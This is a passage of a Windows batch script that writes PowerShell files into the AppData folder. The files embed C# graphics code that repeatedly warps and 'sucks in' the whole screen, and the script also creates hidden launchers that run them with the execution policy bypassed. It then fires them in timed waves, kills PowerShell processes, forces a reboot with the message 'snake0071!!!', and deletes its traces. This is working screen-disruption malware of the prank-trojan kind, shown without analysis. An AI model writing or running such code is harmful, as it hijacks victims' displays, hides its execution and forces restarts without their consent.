
@echo ^"@                                                                                                                                                                 >> 8.ps1
echo [GraphicsHelper2]::ScrollGraphicsDown()                                                                                                                             >> 8.ps1
echo                                                                                                                                                                     >> 8.ps1


echo Add-Type -TypeDefinition @^"                                                                                                                                                             > 9.ps1
echo using System;                                                                                                                                                                            >> 9.ps1
echo using System.Drawing;                                                                                                                                                                    >> 9.ps1
echo using System.Runtime.InteropServices;                                                                                                                                                    >> 9.ps1
echo using System.Threading;                                                                                                                                                                  >> 9.ps1
echo public class GraphicsHelper                                                                                                                                                              >> 9.ps1
echo {                                                                                                                                                                                        >> 9.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                                                      >> 9.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                                                         >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, uint dwRop);                           >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern IntPtr CreateCompatibleDC(IntPtr hdc);                                                                                                                          >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);                                                                                             >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);                                                                                                                >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern bool DeleteObject(IntPtr hObject);                                                                                                                              >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern bool DeleteDC(IntPtr hdc);                                                                                                                                      >> 9.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);                                                                                                               >> 9.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                                                      >> 9.ps1
echo     public const uint SRCCOPY = 0x00CC0020;                                                                                                                                              >> 9.ps1
echo     public static void ManipulateGraphics(int repeatCount)                                                                                                                               >> 9.ps1
echo     {                                                                                                                                                                                    >> 9.ps1
echo         IntPtr hdcSource = GetDC(IntPtr.Zero);                                                                                                                                           >> 9.ps1
echo         IntPtr hdcDest = CreateCompatibleDC(hdcSource);                                                                                                                                  >> 9.ps1
echo         RECT rect;                                                                                                                                                                       >> 9.ps1
echo         GetWindowRect(GetDesktopWindow(), out rect);                                                                                                                                     >> 9.ps1
echo         int width = rect.Right - rect.Left;                                                                                                                                              >> 9.ps1
echo         int height = rect.Bottom - rect.Top;                                                                                                                                             >> 9.ps1
echo         int step = 7; // 빨려들어가는 간격                                                                                                                                                       >> 9.ps1
echo         int delay = 0; // 각 프레임 사이의 딜레이(ms)                                                                                                                                              >> 9.ps1
echo         IntPtr hBitmap = IntPtr.Zero;                                                                                                                                                    >> 9.ps1
echo         IntPtr hOldBitmap = IntPtr.Zero;                                                                                                                                                 >> 9.ps1
echo         try                                                                                                                                                                              >> 9.ps1
echo         {                                                                                                                                                                                >> 9.ps1
echo             hBitmap = IntPtr.Zero;                                                                                                                                                       >> 9.ps1
echo             hBitmap = CreateCompatibleBitmap(hdcSource, width, height);                                                                                                                  >> 9.ps1
echo             hOldBitmap = SelectObject(hdcDest, hBitmap);                                                                                                                                 >> 9.ps1
echo             for (int repeat = 0; repeat < repeatCount; repeat++)                                                                                                                         >> 9.ps1
echo             {                                                                                                                                                                            >> 9.ps1
echo                 for (int i = 0; i ^< width / 2; i += step)                                                                                                                                >> 9.ps1
echo                 {                                                                                                                                                                        >> 9.ps1
echo                     int xDest = rect.Left - i;                                                                                                                                           >> 9.ps1
echo                     int yDest = rect.Top - i;                                                                                                                                            >> 9.ps1
echo                     int copyWidth = width - 2 * i;                                                                                                                                       >> 9.ps1
echo                     int copyHeight = height - 2 * i;                                                                                                                                     >> 9.ps1
echo                     BitBlt(hdcDest, xDest, yDest, copyWidth, copyHeight, hdcSource, xDest + step, yDest + step, SRCCOPY);                                                                >> 9.ps1
echo                     BitBlt(hdcSource, 0, 0, width, height, hdcDest, 0, 0, SRCCOPY);                                                                                                      >> 9.ps1
echo                     Thread.Sleep(delay);                                                                                                                                                 >> 9.ps1
echo                 }                                                                                                                                                                        >> 9.ps1
echo             }                                                                                                                                                                            >> 9.ps1
echo         }                                                                                                                                                                                >> 9.ps1
echo         finally                                                                                                                                                                          >> 9.ps1
echo         {                                                                                                                                                                                >> 9.ps1
echo             if (hBitmap ^!= IntPtr.Zero)                                                                                                                                                  >> 9.ps1
echo             {                                                                                                                                                                            >> 9.ps1
echo                 SelectObject(hdcDest, hOldBitmap);                                                                                                                                       >> 9.ps1
echo                 DeleteObject(hBitmap);                                                                                                                                                   >> 9.ps1
echo             }                                                                                                                                                                            >> 9.ps1
echo             DeleteDC(hdcDest);                                                                                                                                                           >> 9.ps1
echo             ReleaseDC(IntPtr.Zero, hdcSource);                                                                                                                                           >> 9.ps1
echo         }                                                                                                                                                                                >> 9.ps1
echo     }                                                                                                                                                                                    >> 9.ps1
echo }                                                                                                                                                                                        >> 9.ps1
echo public struct RECT                                                                                                                                                                       >> 9.ps1
echo {                                                                                                                                                                                        >> 9.ps1
echo     public int Left;                                                                                                                                                                     >> 9.ps1
echo     public int Top;                                                                                                                                                                      >> 9.ps1
echo     public int Right;                                                                                                                                                                    >> 9.ps1
echo     public int Bottom;                                                                                                                                                                   >> 9.ps1
echo }                                                                                                                                                                                        >> 9.ps1
echo ^"@                                                                                                                                                                                      >> 9.ps1
echo [GraphicsHelper]::ManipulateGraphics(545325)                                                                                                                                             >> 9.ps1



echo cd %appdata%\ren\ > 0.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 0.bat
set "ea=%appdata%\ren\benben.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 0.bat

echo cd %appdata%\ren\ > 1.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 1.bat
set "ea=%appdata%\ren\1.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 1.bat

echo cd %appdata%\ren\ > 2b.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 2b.bat
set "ea=%appdata%\ren\2b.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 2b.bat

echo cd %appdata%\ren\ > 3.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 3.bat
set "ea=%appdata%\ren\3.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 3.bat

echo cd %appdata%\ren\ > 4.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 4.bat
set "ea=%appdata%\ren\4.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 4.bat

echo cd %appdata%\ren\ > 5.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 5.bat
set "ea=%appdata%\ren\5.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 5.bat

echo cd %appdata%\ren\ > 6.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 6.bat
set "ea=%appdata%\ren\6.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 6.bat

echo cd %appdata%\ren\ > 7.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 7.bat
set "ea=%appdata%\ren\7.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 7.bat

echo cd %appdata%\ren\ > 6l.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 6l.bat
set "ea=%appdata%\ren\6l.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 6l.bat

echo cd %appdata%\ren\ > 7l.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 7l.bat
set "ea=%appdata%\ren\7l.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 7l.bat

echo cd %appdata%\ren\ > 8.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 8.bat
set "ea=%appdata%\ren\8.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 8.bat

echo cd %appdata%\ren\ > 9.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 9.bat
set "ea=%appdata%\ren\9.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 9.bat

start /min 0.bat
start /min 5.bat
start /min 6.bat
timeout 20
start /min 2b.bat
start /min 2b.bat
start /min 3.bat
start /min 6.bat
timeout 20
start /min 4.bat
start /min 1.bat
timeout 30
start /min 7.bat
timeout 40
start /min taskkill /f /im powershell.exe
start /min 0.bat
start /min 8.bat
start /min 4.bat
start /min 9.bat
timeout 20
start /min taskkill /f /im powershell.exe
start /min 0.bat
start /min 7l.bat
start /min 6l.bat
shutdown -r -t 15 -c "snake0071!!!"
timeout 10
del /s /q %appdata%\ren